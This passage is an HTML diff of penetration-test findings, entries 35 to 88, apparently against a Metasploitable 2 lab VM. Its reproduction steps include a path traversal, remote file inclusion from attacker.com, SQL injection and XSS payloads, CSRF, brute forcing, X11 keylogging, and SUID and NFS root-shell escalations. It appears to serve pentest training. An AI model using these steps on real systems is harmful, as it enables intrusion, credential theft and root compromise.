+        <p>The server reveals specific module versions and OS details in the HTTP response headers, assisting attackers in targeting the environment.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Command: <code>curl -I http://192.168.99.131</code></li>
+            <li>Observe the <code>Server:</code> header for exact versions.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">36. TWiki View File Path Traversal (Port 80)</div>
+        <span class="tag">LFI</span> <span class="tag">Path Traversal</span>
+        
+        <h3>## Summary:</h3>
+        <p>The TWiki application fails to properly validate file paths in its view script, allowing an attacker to read files outside the web root.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131/twiki/bin/view/Main/../..//etc/passwd</code></li>
+        </ol>
+        <h3>## Supporting Material/References:</h3>
+        <ul><li>CVE-2004-1037</li></ul>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">37. MySQL MOF Execution (Windows/Linux Context)</div>
+        <span class="tag">PrivEsc</span> <span class="tag">Database</span>
+        
+        <h3>## Summary:</h3>
+        <p>If the MySQL user has <code>FILE</code> privileges, an attacker can write a Managed Object Format (MOF) file to the system to achieve execution (often used in Windows, but applicable for file writes in Linux).</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use Metasploit: <code>exploit/multi/mysql/mysql_mof</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">38. IRC IP Address Leakage</div>
+        <span class="tag">Privacy</span> <span class="tag">IRC</span>
+        
+        <h3>## Summary:</h3>
+        <p>The IRC daemon on this machine does not properly mask (cloak) the IP addresses of connected users, allowing anyone on the network to see the real IP of participants.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Connect to IRC and run <code>/whois [username]</code>.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">39. phpMyAdmin 3.5.x /e Modifier RCE (Port 80)</div>
+        <span class="tag">RCE</span> <span class="tag">PHP</span>
+        
+        <h3>## Summary:</h3>
+        <p>A vulnerability in the <code>preg_replace</code> function in phpMyAdmin allows remote attackers to execute arbitrary PHP code via a crafted request.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use Metasploit: <code>use exploit/multi/http/phpmyadmin_preg_replace</code></li>
+        </ol>
+        <h3>## Supporting Material/References:</h3>
+        <ul><li>CVE-2013-3238</li></ul>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">40. Apache server-status Information Leak (Port 80)</div>
+        <span class="tag">Info Leak</span> <span class="tag">Recon</span>
+        
+        <h3>## Summary:</h3>
+        <p>The <code>/server-status</code> page is publicly accessible. This reveals what URLs are being visited, the IP addresses of visitors, and internal server metrics.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131/server-status</code></li>
+        </ol>
+    </div>
+    <div class="vuln-card high">
+        <div class="vuln-title">41. Mutillidae Header-Based SQL Injection (Port 80)</div>
+        <span class="tag">SQLi</span> <span class="tag">Headers</span>
+        
+        <h3>## Summary:</h3>
+        <p>Mutillidae logs the <code>User-Agent</code> string of visitors into a database. This logging function is vulnerable to SQL injection, allowing an attacker to execute database commands by modifying their browser's header.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Capture a request to Mutillidae in <b>Burp Suite</b>.</li>
+            <li>Modify the <code>User-Agent</code> field to: <code>' OR 1=1 -- </code></li>
+            <li><b>Result:</b> Depending on the page, this can leak database information or bypass logging restrictions.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">42. SNMP Default Community String "public"</div>
+        <span class="tag">UDP</span> <span class="tag">Recon</span> <span class="tag">Info Leak</span>
+        
+        <h3>## Summary:</h3>
+        <p>The Simple Network Management Protocol (SNMP) service uses the default community string <code>public</code>. This allows anyone to query the system for running processes, network interfaces, and system uptime.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <b>snmp-check</b> or <b>snmpwalk</b>:</li>
+            <pre>snmp-check -t 192.168.99.131 -c public</pre>
+            <li><b>Result:</b> A full report of the system's internal state is generated.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">43. phpMyAdmin Insecure Configuration Storage</div>
+        <span class="tag">Database</span> <span class="tag">Web</span>
+        
+        <h3>## Summary:</h3>
+        <p>The phpMyAdmin configuration storage is not fully secured, which can sometimes allow a logged-in user to access metadata about other databases on the server.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Log in to phpMyAdmin (root/no password).</li>
+            <li>Check the <code>phpmyadmin</code> database for sensitive session data or saved queries.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">44. DVWA Local/Remote File Inclusion (Port 80)</div>
+        <span class="tag">LFI</span> <span class="tag">RFI</span>
+        
+        <h3>## Summary:</h3>
+        <p>The "File Inclusion" page in DVWA allows a user to specify a file path via the <code>page</code> parameter. This can be used to read local files (LFI) or execute remote scripts (RFI).</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li><b>LFI:</b> <code>http://192.168.99.131/dvwa/vulnerabilities/fi/?page=/etc/passwd</code></li>
+            <li><b>RFI:</b> <code>http://192.168.99.131/dvwa/vulnerabilities/fi/?page=http://attacker.com/shell.txt</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">45. SMB NTLM Information Disclosure</div>
+        <span class="tag">SMB</span> <span class="tag">Fingerprint</span>
+        
+        <h3>## Summary:</h3>
+        <p>The SMB service leaks the internal hostname and OS version (Ubuntu/Samba 3.X) during the initial NTLM negotiation phase.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use Nmap script: <code>nmap -p 445 --script smb-os-discovery 192.168.99.131</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">46. TikiWiki Unauthenticated Page Editing</div>
+        <span class="tag">Defacement</span> <span class="tag">Web</span>
+        
+        <h3>## Summary:</h3>
+        <p>Certain pages within the TikiWiki installation are configured with "Anonymous" edit permissions, allowing anyone to modify the content of the site.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to a Wiki page.</li>
+            <li>Look for an "Edit" button. If present, modify the page content.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">47. MySQL User Enumeration via Timing</div>
+        <span class="tag">Recon</span> <span class="tag">Side-Channel</span>
+        
+        <h3>## Summary:</h3>
+        <p>The version of MySQL on Metasploitable 2 is susceptible to timing attacks that allow an attacker to determine if a specific username exists based on the server's response time.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <b>Nmap</b>: <code>nmap -p 3306 --script mysql-enum 192.168.99.131</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">48. HTTP TRACE Method Enabled</div>
+        <span class="tag">XST</span> <span class="tag">Info Leak</span>
+        
+        <h3>## Summary:</h3>
+        <p>The <code>TRACE</code> method is enabled on the Apache server. This can lead to Cross-Site Tracing (XST), allowing attackers to steal sensitive headers like cookies.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Command: <code>curl -X TRACE http://192.168.99.131</code></li>
+            <li>If the server echoes the request back, it is vulnerable.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">49. World-Writeable Web Directories</div>
+        <span class="tag">PrivEsc</span> <span class="tag">Misconfiguration</span>
+        
+        <h3>## Summary:</h3>
+        <p>Many directories within <code>/var/www/</code> have world-writeable permissions (777). This allows a low-privilege user (like <code>msfadmin</code>) to overwrite web pages or upload web shells.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Log in via SSH/Telnet.</li>
+            <li>Command: <code>find /var/www -perm -o+w -type d</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">50. SUID Nmap Privilege Escalation</div>
+        <span class="tag">PrivEsc</span> <span class="tag">Root Shell</span>
+        
+        <h3>## Summary:</h3>
+        <p>Older versions of Nmap (like the one installed) have an "interactive" mode. If the Nmap binary has the SUID bit set, you can use this mode to escape to a root shell.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Check for SUID: <code>ls -l /usr/bin/nmap</code></li>
+            <li>If the 's' bit is present: <code>nmap --interactive</code></li>
+            <li>Inside nmap, type: <code>!sh</code></li>
+            <li><b>Result:</b> You are now <code>root</code>.</li>
+        </ol>
+    </div>
+    <div class="vuln-card medium">
+        <div class="vuln-title">51. SSL/TLS Support for Weak Ciphers (Export Grade)</div>
+        <span class="tag">Encryption</span> <span class="tag">SSL</span>
+        
+        <h3>## Summary:</h3>
+        <p>The HTTPS service on port 443 supports "Export-grade" 40 and 56-bit ciphers. These are extremely weak and can be cracked by modern hardware, leading to the decryption of sensitive traffic.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <b>testssl.sh</b> or <b>nmap</b>:</li>
+            <pre>nmap --script ssl-enum-ciphers -p 443 192.168.99.131</pre>
+            <li>Look for "Grade: F" or ciphers labeled as "EXP" (Export).</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">52. phpinfo() Information Leakage</div>
+        <span class="tag">Info Leak</span> <span class="tag">Recon</span>
+        
+        <h3>## Summary:</h3>
+        <p>A <code>phpinfo.php</code> file is left in the web root. This file reveals the entire PHP configuration, including loaded modules, environment variables, and internal paths.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131/phpinfo.php</code></li>
+            <li>Search for "disable_functions" to see what an attacker can or cannot execute.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">53. Distccd Statistics Disclosure</div>
+        <span class="tag">Recon</span> <span class="tag">Information Leak</span>
+        
+        <h3>## Summary:</h3>
+        <p>The distcc service (distributed compiler) can be queried for its status, revealing details about the underlying OS architecture and compilation history.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <b>Netcat</b> to send a stats request:</li>
+            <pre>echo "DOTS" | nc 192.168.99.131 3632</pre>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">54. Mutillidae Cryptographic Bit-Flipping (Port 80)</div>
+        <span class="tag">Crypto</span> <span class="tag">Web</span>
+        
+        <h3>## Summary:</h3>
+        <p>The application uses CBC mode encryption for session cookies without proper integrity checks. An attacker can flip specific bits in the encrypted cookie to change their user ID or role.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Capture a session cookie in <b>Burp Suite</b>.</li>
+            <li>Use the "Bit-flipper" tool to modify the ciphertext.</li>
+            <li>Observe if the application identifies you as a different user.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">55. SMB Null Session Share Enumeration</div>
+        <span class="tag">SMB</span> <span class="tag">Recon</span>
+        
+        <h3>## Summary:</h3>
+        <p>The SMB service allows "Null Sessions," meaning an unauthenticated attacker can list all shared folders on the system, which helps identify where sensitive data is stored.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <b>smbclient</b>: <code>smbclient -L //192.168.99.131 -N</code></li>
+            <li>(The <code>-N</code> flag tells the tool to use no password).</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">56. Tomcat Default Examples and Documentation</div>
+        <span class="tag">Info Leak</span> <span class="tag">XSS</span>
+        
+        <h3>## Summary:</h3>
+        <p>The default servlet examples are left in the <code>/examples/</code> directory. These often contain vulnerabilities like Cross-Site Scripting (XSS) or can be used for session manipulation.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131:8180/examples/servlets/</code></li>
+            <li>Test the "Session Example" to see if you can manipulate session attributes.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">57. MySQL Lack of Password Policy</div>
+        <span class="tag">Bruteforce</span> <span class="tag">Database</span>
+        
+        <h3>## Summary:</h3>
+        <p>The MySQL service does not lock accounts after multiple failed attempts, allowing an attacker to use dictionary attacks to find user passwords.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <b>Hydra</b>: <code>hydra -l root -P passwords.txt 192.168.99.131 mysql</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">58. RPC Service versioning</div>
+        <span class="tag">Recon</span> <span class="tag">Fingerprint</span>
+        
+        <h3>## Summary:</h3>
+        <p>The RPCBind service reveals the exact versions of the NFS and Portmapper services, allowing an attacker to look up specific CVEs for those versions.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Command: <code>nmap -p 111 --script rpc-grind 192.168.99.131</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">59. Telnet OS Banner Disclosure</div>
+        <span class="tag">Recon</span> <span class="tag">OS Introspection</span>
+        
+        <h3>## Summary:</h3>
+        <p>When connecting to Telnet, the server immediately displays the Linux distribution and kernel version, which is sensitive information during the reconnaissance phase.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Command: <code>nc -nv 192.168.99.131 23</code></li>
+            <li>Observe the text: "Ubuntu 8.04... Kernel 2.6.24-16-server"</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">60. Insecure HTTP Methods Enabled</div>
+        <span class="tag">Web</span> <span class="tag">Recon</span>
+        
+        <h3>## Summary:</h3>
+        <p>The server supports dangerous methods like <code>PROPFIND</code>, <code>DELETE</code>, and <code>PUT</code> in certain areas. This helps an attacker understand what web-based attacks are possible.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Command: <code>curl -X OPTIONS http://192.168.99.131 -v</code></li>
+            <li>Check the <code>Allow:</code> header in the response.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">61. IRC ADMIN Information Disclosure</div>
+        <span class="tag">IRC</span> <span class="tag">Info Leak</span>
+        
+        <h3>## Summary:</h3>
+        <p>The <code>ADMIN</code> command on the IRC server reveals the name and email address of the server administrator, which can be used for social engineering or phishing attacks.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Connect to IRC: <code>nc 192.168.99.131 6667</code></li>
+            <li>Type: <code>ADMIN</code></li>
+            <li><b>Result:</b> The server returns admin contact details.</li>
+        </ol>
+    </div>
+    <div class="vuln-card medium">
+        <div class="vuln-title">62. Mutillidae Reflected XSS in Lookup Tool</div>
+        <span class="tag">XSS</span> <span class="tag">Reflected</span>
+        <h3>## Summary:</h3>
+        <p>The DNS Lookup tool in Mutillidae does not sanitize the 'target' parameter, allowing an attacker to execute arbitrary JavaScript in the victim's browser via a crafted URL.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>URL: <code>http://192.168.99.131/mutillidae/index.php?page=dns-lookup.php&target=&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+        </ol>
+    </div>
+
+<div class="vuln-card high">
+        <div class="vuln-title">63. DVWA Brute Force Weakness</div>
+        <span class="tag">Auth</span> <span class="tag">Brute Force</span>
+        <h3>## Summary:</h3>
+        <p>The login form in DVWA (Low Security) has no rate-limiting, account lockout, or CAPTCHA. This allows an attacker to use dictionary attacks to guess passwords indefinitely without being blocked.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Open Burp Suite and capture a login request to <code>/dvwa/vulnerabilities/brute/</code>.</li>
+            <li>Send the request to <b>Intruder</b> and set positions on the password parameter.</li>
+            <li>Load a wordlist (e.g., <code>rockyou.txt</code>) and start the attack.</li>
+            <li>Identify the correct password by looking for a different HTTP response length or status code.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">64. Missing 'HttpOnly' and 'Secure' Flags</div>
+        <span class="tag">Web</span> <span class="tag">Cookies</span>
+        <h3>## Summary:</h3>
+        <p>Sensitive session cookies (like <code>PHPSESSID</code>) are set without security flags. Missing <b>HttpOnly</b> allows JavaScript to steal cookies via XSS, and missing <b>Secure</b> allows cookies to be sent over unencrypted HTTP connections.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Open Browser DevTools (F12) and go to the <b>Application</b> or <b>Storage</b> tab.</li>
+            <li>Under <b>Cookies</b>, inspect the flags for the current domain.</li>
+            <li>Observe that the 'HttpOnly' and 'Secure' columns are unchecked.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">65. Apache Content Negotiation Disclosure (MultiViews)</div>
+        <span class="tag">Recon</span> <span class="tag">Info Leak</span>
+        <h3>## Summary:</h3>
+        <p>The 'MultiViews' feature in Apache allows the server to guess which file the user wants if the extension is missing. Attackers can abuse this to discover hidden files or backup files (e.g., <code>.php.bak</code>) by requesting the base name.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Request a page without its extension: <code>http://192.168.99.131/index</code>.</li>
+            <li>If the server returns <code>index.php</code> instead of a 404 error, MultiViews is enabled.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">66. PHP Insecure Configuration: allow_url_fopen</div>
+        <span class="tag">RFI</span> <span class="tag">PHP</span>
+        <h3>## Summary:</h3>
+        <p>The <code>allow_url_fopen</code> setting is enabled in the PHP configuration. This allows PHP functions to retrieve data from remote locations (URLs), which significantly increases the impact of File Inclusion vulnerabilities, turning LFI into RFI.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>View the <code>phpinfo.php</code> page on the server.</li>
+            <li>Search for the <b>allow_url_fopen</b> directive and verify it is set to <b>On</b>.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">67. Finger Service User Disclosure (Port 79)</div>
+        <span class="tag">Recon</span> <span class="tag">Finger</span>
+        <h3>## Summary:</h3>
+        <p>The Finger service is an old protocol that reveals information about system users, such as login names, real names, and last login times. This is useful for an attacker during the enumeration phase to build a target user list.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Run the finger command from a Linux terminal: <code>finger @192.168.99.131</code></li>
+            <li>Review the list of usernames returned by the server.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">68. NFS No_Root_Squash Privilege Escalation</div>
+        <span class="tag">PrivEsc</span> <span class="tag">NFS</span>
+        <h3>## Summary:</h3>
+        <p>The NFS share is exported with <code>no_root_squash</code>. This means if a remote user connects as root, they are treated as the local root user. An attacker can use this to upload an SUID binary and execute it on the target to gain a root shell.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Mount the share: <code>mount -t nfs 192.168.99.131:/ /tmp/mountpoint</code></li>
+            <li>Copy a shell to the mount: <code>cp /bin/bash /tmp/mountpoint/tmp/rootshell</code></li>
+            <li>Set SUID permissions: <code>chmod +s /tmp/mountpoint/tmp/rootshell</code></li>
+            <li>On the target machine, run <code>/tmp/rootshell -p</code> to become root.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">69. MySQL Password Hashes in Web Backups</div>
+        <span class="tag">Data Leak</span> <span class="tag">MySQL</span>
+        <h3>## Summary:</h3>
+        <p>Backup files (like <code>.sql</code> or <code>.bak</code>) are often left in the web directory. These files contain database structure and sensitive data, including password hashes for application users and administrators.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use a tool like <b>Dirb</b> or <b>Gobuster</b> to find common backup extensions.</li>
+            <li>Download the identified file and search for <code>INSERT INTO `users`</code> statements to find hashes.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">70. ICMP Timestamp Information Leak</div>
+        <span class="tag">Network</span> <span class="tag">Recon</span>
+        <h3>## Summary:</h3>
+        <p>The system responds to ICMP type 13 (Timestamp) requests. This allows an attacker to learn the current system time, which can be used to defeat time-based security algorithms or determine the server's uptime.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <b>hping3</b> to send a timestamp request: <code>hping3 -1 --icmptype 13 192.168.99.131</code></li>
+            <li>Observe the returned timestamp value in the output.</li>
+        </ol>
+    </div>
+    <div class="vuln-card medium">
+        <div class="vuln-title">71. SSH Lack of Account Lockout Policy (Port 22)</div>
+        <span class="tag">Brute Force</span> <span class="tag">SSH</span>
+        <h3>## Summary:</h3>
+        <p>The SSH service is not configured with a "MaxAuthTries" limit or an external tool like Fail2Ban. This allow attackers to perform high-speed dictionary attacks against system accounts without being temporarily banned or locked out.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Attempt to log in via SSH with incorrect passwords multiple times.</li>
+            <li>Observe that the connection is never dropped and the account remains active for further attempts.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">72. Telnet Cleartext Administration (Port 23)</div>
+        <span class="tag">Sniffing</span> <span class="tag">Insecure Protocol</span>
+        <h3>## Summary:</h3>
+        <p>The Telnet protocol does not encrypt data. All traffic, including usernames and passwords, is sent in plain text. An attacker on the same network can use a sniffer to capture administrative credentials.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Run a packet sniffer like <b>Wireshark</b> or <b>tcpdump</b> on the network interface.</li>
+            <li>Perform a login to the target via Telnet.</li>
+            <li>Follow the TCP stream in the sniffer to read the password in cleartext.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">73. Apache Default 'Welcome' Page Disclosure</div>
+        <span class="tag">Recon</span> <span class="tag">Info Leak</span>
+        <h3>## Summary:</h3>
+        <p>The default Apache2 Ubuntu "It works!" page is present. This confirms the exact web server software and OS distribution (Ubuntu), which helps an attacker narrow down potential exploits.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131/</code></li>
+            <li>Observe the default server documentation and file paths listed on the page.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">74. PHP 'Magic Quotes' Disabled (magic_quotes_gpc)</div>
+        <span class="tag">SQLi</span> <span class="tag">PHP</span>
+        <h3>## Summary:</h3>
+        <p>The <code>magic_quotes_gpc</code> directive is set to Off. While this is a deprecated feature, its absence means the application does not automatically escape single quotes, making it much easier to perform SQL Injection attacks.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Check <code>phpinfo.php</code> for the <b>magic_quotes_gpc</b> value.</li>
+            <li>Verify that input containing <code>'</code> is passed directly to database queries in Mutillidae or DVWA.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">75. World-Readable /etc/issue File</div>
+        <span class="tag">Info Leak</span> <span class="tag">System</span>
+        <h3>## Summary:</h3>
+        <p>The <code>/etc/issue</code> file, which contains the system identification string shown at the login prompt, is readable by all users. This reveals the specific Linux kernel and version details.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Log in as a low-privilege user (msfadmin).</li>
+            <li>Run: <code>cat /etc/issue</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">76. Apache 'FollowSymLinks' Misconfiguration</div>
+        <span class="tag">LFI</span> <span class="tag">Web</span>
+        <h3>## Summary:</h3>
+        <p>The Apache configuration allows the web server to follow symbolic links. If an attacker can create a symlink in a writeable web directory, they can read any file the <code>www-data</code> user has access to, including <code>/etc/passwd</code>.</p>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">77. rpc.statd Information Disclosure (Port 111)</div>
+        <span class="tag">Recon</span> <span class="tag">RPC</span>
+        <h3>## Summary:</h3>
+        <p>The <code>rpc.statd</code> service reveals status information about the network status monitor. This can be used to map internal network details or identify the version of the RPC service for specific buffer overflow exploits.</p>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">78. FTP Cleartext Credentials (Port 21)</div>
+        <span class="tag">Sniffing</span> <span class="tag">Insecure Protocol</span>
+        <h3>## Summary:</h3>
+        <p>The FTP service on Port 21 does not use TLS/SSL encryption. Usernames and passwords are sent over the wire in plain text, making them easy to steal via MITM (Man-in-the-Middle) attacks.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Capture traffic with <b>Wireshark</b> while logging into FTP.</li>
+            <li>Filter for <code>ftp</code> and look for the <code>USER</code> and <code>PASS</code> packets.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">79. Unrestricted Access to /tikiwiki/db/</div>
+        <span class="tag">Data Leak</span> <span class="tag">Web</span>
+        <h3>## Summary:</h3>
+        <p>The <code>/db/</code> directory in the TikiWiki installation is not protected by an <code>.htaccess</code> file. An attacker can browse this directory to find database configuration files or SQL dumps.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131/tikiwiki/db/</code></li>
+            <li>Attempt to download <code>tiki.sql</code> or similar files if present.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">80. Support for Weak NTLMv1 Authentication</div>
+        <span class="tag">SMB</span> <span class="tag">Crypto</span>
+        <h3>## Summary:</h3>
+        <p>The Samba service is configured to support NTLMv1 authentication. This version of the challenge-response protocol is vulnerable to "Pass-the-Hash" attacks and can be cracked much faster than NTLMv2.</p>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">81. Mutillidae "Secret" Hint Disclosure</div>
+        <span class="tag">Logic</span> <span class="tag">Web</span>
+        <h3>## Summary:</h3>
+        <p>The application includes an administrative "hint" system that is not properly restricted. By enabling "hints" in the settings, the app leaks internal query logic and hidden parameter names to any user.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>In Mutillidae, go to "Setup/Reset DB" or any main page.</li>
+            <li>Click "Toggle Hints" and observe the detailed technical information displayed on every page.</li>
+        </ol>
+    </div>
+    <div class="vuln-card high">
+        <div class="vuln-title">82. DVWA CSRF Password Change</div>
+        <span class="tag">CSRF</span> <span class="tag">Web</span>
+        <h3>## Summary:</h3>
+        <p>The "Change Password" function in DVWA (Low Security) does not use unique anti-CSRF tokens. An attacker can host a malicious page that, when visited by a logged-in user, sends a hidden request to change the user's password without their knowledge.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Login to DVWA.</li>
+            <li>Craft an HTML page with a hidden form pointing to: <code>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change</code></li>
+            <li>Lure the logged-in user to the malicious page. The password will change automatically.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">83. PHP Insecure Configuration: register_globals</div>
+        <span class="tag">Logic</span> <span class="tag">PHP</span>
+        <h3>## Summary:</h3>
+        <p>The <code>register_globals</code> setting is enabled. This is a dangerous feature that automatically registers URL parameters (GET/POST) as global PHP variables. Attackers can use this to overwrite internal variables to bypass authentication or logic checks.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Check <code>phpinfo.php</code> for <b>register_globals = On</b>.</li>
+            <li>Append <code>?authenticated=1</code> to a PHP script that uses a variable named <code>$authenticated</code> to see if it bypasses a login check.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">84. SSH Version Banner Disclosure</div>
+        <span class="tag">Recon</span> <span class="tag">SSH</span>
+        <h3>## Summary:</h3>
+        <p>The SSH service displays a detailed banner upon connection: <code>OpenSSH 4.7p1 Debian 8ubuntu1</code>. This reveals the exact OS version and patch level, allowing an attacker to search for specific kernel or service vulnerabilities.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Connect via Netcat: <code>nc 192.168.99.131 22</code></li>
+            <li>Observe the first line of the response.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">85. X11 Remote Keylogging</div>
+        <span class="tag">GUI</span> <span class="tag">Snoop</span>
+        <h3>## Summary:</h3>
+        <p>Since the X11 server on Port 6000 is open to the network without authentication, an attacker can use a tool like <b>xspy</b> to capture every keystroke typed by a user on the local console of the machine.</p>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Install xspy on your attacker machine.</li>
+            <li>Run: <code>xspy -display 192.168.99.131:0</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">86. Predictable Temporary File Names (/tmp)</div>
+        <span class="tag">System</span> <span class="tag">Race Condition</span>
+        <h3>## Summary:</h3>
+        <p>Internal scripts and cron jobs on Metasploitable 2 use predictable names for files in the <code>/tmp/</code> directory. An attacker can create symbolic links to sensitive files (like <code>/etc/shadow</code>) with these names, causing the script to overwrite them.</p>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">87. Apache JServ Protocol (AJP) Exposure</div>
+        <span class="tag">Tomcat</span> <span class="tag">Info Leak</span>
+        <h3>## Summary:</h3>
+        <p>The AJP connector is exposed. This protocol is intended for communication between a web server and the application server. It often bypasses standard HTTP security filters and can be used to leak internal system files (Ghostcat-style attacks).</p>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">88. Overly Permissive /etc/hosts.allow</div>
+        <span class="tag">Config</span> <span class="tag">System</span>
+        <h3>## Summary:</h3>
